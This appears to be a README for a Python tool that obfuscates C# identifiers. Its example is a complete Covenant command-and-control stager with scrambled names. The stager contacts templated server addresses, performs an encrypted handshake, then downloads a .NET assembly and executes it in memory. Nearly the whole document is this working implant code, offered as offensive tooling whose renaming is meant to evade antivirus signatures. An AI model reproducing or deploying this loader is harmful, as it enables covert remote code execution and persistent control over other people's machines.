# Sharp-Obfuscate
Obfuscate C# Function, Parameter, and Variable Names
```
usage: Obfuscator.py [-h] [-o OutFile] File

Obfuscate C# Function,Parameter, and Variable names

positional arguments:
  File

optional arguments:
  -h, --help  show this help message and exit
  -o OutFile
```

Covenant Stager Example:
```
using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace FhoawtKmEOy
{
    public class FhoawtKmEOy
    {
        public FhoawtKmEOy()
        {
            LLMfvkoIeCw();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new FhoawtKmEOy();
        }
        public static void IDOwRYTBsNu()
        {
            new FhoawtKmEOy();
        }
        public void LLMfvkoIeCw()
        {
            try
            {
                List<string> PAZMqYZnSfh = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
                string UgVrubOuWpZ = @"{{REPLACE_COVENANT_CERT_HASH}}";
                                List<string> BaBXRDLmiZY = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                                List<string> TdYgUuiktEm = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                                List<string> NnYmTynxnDg = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                                string TVwttROEYsh = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string LsLiXAiopTK = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool VwqyKkqWiLI = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool RYSwCDRsvFC = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");

                Random ZsKgtUivxOR = new Random();
                string aGUID = @"{{REPLACE_GRUNT_GUID}}";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] ZtCYZAIyMsw = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
                string UlhXForFKXu = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

                Aes DfmTHbbMMmD = Aes.Create();
                DfmTHbbMMmD.Mode = CipherMode.CBC;
                DfmTHbbMMmD.Padding = PaddingMode.PKCS7;
                DfmTHbbMMmD.Key = ZtCYZAIyMsw;
                DfmTHbbMMmD.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(ZtCYZAIyMsw);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] BJdGapQhjbM = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] DQGFxphnJhx = DfmTHbbMMmD.CreateEncryptor().TransformFinalBlock(BJdGapQhjbM, 0, BJdGapQhjbM.Length);
                byte[] hash = hmac.ComputeHash(DQGFxphnJhx);
                string KCgqcvtpKms = String.Format(UlhXForFKXu, aGUID + GUID, "0", "", Convert.ToBase64String(DfmTHbbMMmD.IV), Convert.ToBase64String(DQGFxphnJhx), Convert.ToBase64String(hash));

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                {
                    bool valid = true;
                    if (RYSwCDRsvFC && UgVrubOuWpZ != "")
                    {
                        valid = cert.GetCertHashString() == UgVrubOuWpZ;
                    }
                    if (valid && VwqyKkqWiLI)
                    {
                        valid = errors == System.Net.Security.SslPolicyErrors.None;
                    }
                    return valid;
                };
                string HEmGEJMqcXF = MessageTransform.Transform(Encoding.UTF8.GetBytes(KCgqcvtpKms));
                KpkrPqQGDel wc = null;
                string KagELCgqqee = "";
                wc = new KpkrPqQGDel();
                wc.UseDefaultCredentials = true;
                wc.Proxy = WebRequest.DefaultWebProxy;
                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                string DlFSwZFGwtI = "";
                foreach (string uri in PAZMqYZnSfh)
                {
                    try
                    {
                        for (int i = 0; i < TdYgUuiktEm.Count; i++) { wc.Headers.Set(BaBXRDLmiZY[i].Replace("{GUID}", ""), TdYgUuiktEm[i].Replace("{GUID}", "")); }
                        wc.DownloadString(uri + NnYmTynxnDg[ZsKgtUivxOR.Next(NnYmTynxnDg.Count)].Replace("{GUID}", ""));
                        DlFSwZFGwtI = uri;
                    }
                    catch
                    {
                        continue;
                    }
                }
                for (int i = 0; i < TdYgUuiktEm.Count; i++) { wc.Headers.Set(BaBXRDLmiZY[i].Replace("{GUID}", GUID), TdYgUuiktEm[i].Replace("{GUID}", GUID)); }
                KagELCgqqee = wc.UploadString(DlFSwZFGwtI + NnYmTynxnDg[ZsKgtUivxOR.Next(NnYmTynxnDg.Count)].Replace("{GUID}", GUID), String.Format(TVwttROEYsh, HEmGEJMqcXF)).Replace("\"", "");
                string MYIvsNPYoLs = Parse(KagELCgqqee, LsLiXAiopTK)[0];
                MYIvsNPYoLs = Encoding.UTF8.GetString(MessageTransform.Invert(MYIvsNPYoLs));
                List<string> WKMCfMXGJwq = Parse(MYIvsNPYoLs, UlhXForFKXu);
                string ZfOCmPMngko = WKMCfMXGJwq[3];
                string CooOClyFQZY = WKMCfMXGJwq[4];
                string KAgYyjOOacV = WKMCfMXGJwq[5];
                byte[] PkABWNjANqq = Convert.FromBase64String(CooOClyFQZY);
                if (KAgYyjOOacV != Convert.ToBase64String(hmac.ComputeHash(PkABWNjANqq))) { return; }
                DfmTHbbMMmD.IV = Convert.FromBase64String(ZfOCmPMngko);
                byte[] OwfVraccBrE = DfmTHbbMMmD.CreateDecryptor().TransformFinalBlock(PkABWNjANqq, 0, PkABWNjANqq.Length);
                byte[] FIDzOSkxigy = rsa.Decrypt(OwfVraccBrE, true);

                Aes KkvdpdVtwWX = Aes.Create();
                KkvdpdVtwWX.Mode = CipherMode.CBC;
                KkvdpdVtwWX.Padding = PaddingMode.PKCS7;
                KkvdpdVtwWX.Key = FIDzOSkxigy;
                KkvdpdVtwWX.GenerateIV();
                hmac = new HMACSHA256(KkvdpdVtwWX.Key);
                byte[] XdLrYpUKZoV = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(XdLrYpUKZoV);
                byte[] LvtlcHUxgxn = KkvdpdVtwWX.CreateEncryptor().TransformFinalBlock(XdLrYpUKZoV, 0, XdLrYpUKZoV.Length);
                hash = hmac.ComputeHash(LvtlcHUxgxn);

                string InDaNXtLlOU = String.Format(UlhXForFKXu, GUID, "1", "", Convert.ToBase64String(KkvdpdVtwWX.IV), Convert.ToBase64String(LvtlcHUxgxn), Convert.ToBase64String(hash));
                HEmGEJMqcXF = MessageTransform.Transform(Encoding.UTF8.GetBytes(InDaNXtLlOU));

                string VYUtITNQYIw = "";
                for (int i = 0; i < TdYgUuiktEm.Count; i++) { wc.Headers.Set(BaBXRDLmiZY[i].Replace("{GUID}", GUID), TdYgUuiktEm[i].Replace("{GUID}", GUID)); }
                VYUtITNQYIw = wc.UploadString(DlFSwZFGwtI + NnYmTynxnDg[ZsKgtUivxOR.Next(NnYmTynxnDg.Count)].Replace("{GUID}", GUID), String.Format(TVwttROEYsh, HEmGEJMqcXF)).Replace("\"", "");
                MYIvsNPYoLs = Parse(VYUtITNQYIw, LsLiXAiopTK)[0];
                MYIvsNPYoLs = Encoding.UTF8.GetString(MessageTransform.Invert(MYIvsNPYoLs));
                WKMCfMXGJwq = Parse(MYIvsNPYoLs, UlhXForFKXu);
                ZfOCmPMngko = WKMCfMXGJwq[3];
                CooOClyFQZY = WKMCfMXGJwq[4];
                KAgYyjOOacV = WKMCfMXGJwq[5];
                PkABWNjANqq = Convert.FromBase64String(CooOClyFQZY);
                if (KAgYyjOOacV != Convert.ToBase64String(hmac.ComputeHash(PkABWNjANqq))) { return; }
                KkvdpdVtwWX.IV = Convert.FromBase64String(ZfOCmPMngko);

                byte[] FfUYvcGjrtJ = KkvdpdVtwWX.CreateDecryptor().TransformFinalBlock(PkABWNjANqq, 0, PkABWNjANqq.Length);
                byte[] CvXOIWEdAoq = new byte[4];
                byte[] DpRzAjQfIJL = new byte[4];
                Buffer.BlockCopy(FfUYvcGjrtJ, 0, CvXOIWEdAoq, 0, 4);
                Buffer.BlockCopy(FfUYvcGjrtJ, 4, DpRzAjQfIJL, 0, 4);
                if (Convert.ToBase64String(XdLrYpUKZoV) != Convert.ToBase64String(CvXOIWEdAoq)) { return; }

                KkvdpdVtwWX.GenerateIV();
                byte[] CoECvrtavNx = KkvdpdVtwWX.CreateEncryptor().TransformFinalBlock(DpRzAjQfIJL, 0, DpRzAjQfIJL.Length);
                hash = hmac.ComputeHash(CoECvrtavNx);

                string SIXKydCIAJA = String.Format(UlhXForFKXu, GUID, "2", "", Convert.ToBase64String(KkvdpdVtwWX.IV), Convert.ToBase64String(CoECvrtavNx), Convert.ToBase64String(hash));
                HEmGEJMqcXF = MessageTransform.Transform(Encoding.UTF8.GetBytes(SIXKydCIAJA));

                string FmGgKZsZHVc = "";
                for (int i = 0; i < TdYgUuiktEm.Count; i++) { wc.Headers.Set(BaBXRDLmiZY[i].Replace("{GUID}", GUID), TdYgUuiktEm[i].Replace("{GUID}", GUID)); }
                FmGgKZsZHVc = wc.UploadString(DlFSwZFGwtI + NnYmTynxnDg[ZsKgtUivxOR.Next(NnYmTynxnDg.Count)].Replace("{GUID}", GUID), String.Format(TVwttROEYsh, HEmGEJMqcXF)).Replace("\"", "");
                MYIvsNPYoLs = Parse(FmGgKZsZHVc, LsLiXAiopTK)[0];
                MYIvsNPYoLs = Encoding.UTF8.GetString(MessageTransform.Invert(MYIvsNPYoLs));
                WKMCfMXGJwq = Parse(MYIvsNPYoLs, UlhXForFKXu);
                ZfOCmPMngko = WKMCfMXGJwq[3];
                CooOClyFQZY = WKMCfMXGJwq[4];
                KAgYyjOOacV = WKMCfMXGJwq[5];
                PkABWNjANqq = Convert.FromBase64String(CooOClyFQZY);
                if (KAgYyjOOacV != Convert.ToBase64String(hmac.ComputeHash(PkABWNjANqq))) { return; }
                KkvdpdVtwWX.IV = Convert.FromBase64String(ZfOCmPMngko);
                byte[] GXKIMjsclXN = KkvdpdVtwWX.CreateDecryptor().TransformFinalBlock(PkABWNjANqq, 0, PkABWNjANqq.Length);
                Assembly XxCgRHhpYvy = Assembly.Load(GXKIMjsclXN);
                XxCgRHhpYvy.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { DlFSwZFGwtI, UgVrubOuWpZ, GUID, KkvdpdVtwWX });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message); }
        }

        public class KpkrPqQGDel : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public KpkrPqQGDel()
            {
                this.CookieContainer = new CookieContainer();
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var UstUOYUyKuU = base.GetWebRequest(address) as HttpWebRequest;
                if (UstUOYUyKuU == null) return base.GetWebRequest(address);
                UstUOYUyKuU.CookieContainer = CookieContainer;
                return UstUOYUyKuU;
            }
        }

        public static List<string> Parse(string data, string DxwkoKEqpFo)
        {
            DxwkoKEqpFo = Regex.Escape(DxwkoKEqpFo).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (DxwkoKEqpFo.Contains("{0}")) { DxwkoKEqpFo = DxwkoKEqpFo.Replace("{0}", "(?'group0'.*)"); }
            if (DxwkoKEqpFo.Contains("{1}")) { DxwkoKEqpFo = DxwkoKEqpFo.Replace("{1}", "(?'group1'.*)"); }
            if (DxwkoKEqpFo.Contains("{2}")) { DxwkoKEqpFo = DxwkoKEqpFo.Replace("{2}", "(?'group2'.*)"); }
            if (DxwkoKEqpFo.Contains("{3}")) { DxwkoKEqpFo = DxwkoKEqpFo.Replace("{3}", "(?'group3'.*)"); }
            if (DxwkoKEqpFo.Contains("{4}")) { DxwkoKEqpFo = DxwkoKEqpFo.Replace("{4}", "(?'group4'.*)"); }
            if (DxwkoKEqpFo.Contains("{5}")) { DxwkoKEqpFo = DxwkoKEqpFo.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(DxwkoKEqpFo).Match(data);
            List<string> QQgIvzevmeD = new List<string>();
            if (match.Groups["group0"] != null) { QQgIvzevmeD.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { QQgIvzevmeD.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { QQgIvzevmeD.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { QQgIvzevmeD.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { QQgIvzevmeD.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { QQgIvzevmeD.Add(match.Groups["group5"].Value); }
            return QQgIvzevmeD;
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}
```
